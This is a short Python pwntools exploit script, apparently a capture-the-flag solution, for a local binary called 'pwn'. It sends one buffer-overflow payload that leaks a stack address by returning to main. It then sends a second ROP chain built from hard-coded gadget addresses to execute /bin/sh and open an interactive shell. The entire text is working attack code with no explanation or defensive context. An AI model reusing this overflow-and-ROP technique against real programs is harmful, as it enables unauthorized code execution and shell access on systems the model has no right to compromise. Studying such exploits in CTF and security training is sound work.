from pwn import *

io=process('pwn')

main=0x0004004ED
execv=0x04004E2
pop_rdi=0x4005a3
pop_rbx_rbp_r12_r13_r14_r15=0x40059A
mov_rdxr13_call=0x0400580 
sys=0x00400517


pl1='/bin/sh\x00'*2+p64(main)
io.send(pl1)
io.recv(0x20)
sh=u64(io.recv(8))-280
print(hex(sh))


pl2='/bin/sh\x00'*2+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(0)*2+p64(sh+0x50)+p64(0)*3
pl2+=p64(mov_rdxr13_call)+p64(execv)
pl2+=p64(pop_rdi)+p64(sh)+p64(sys)
io.send(pl2)

io.interactive()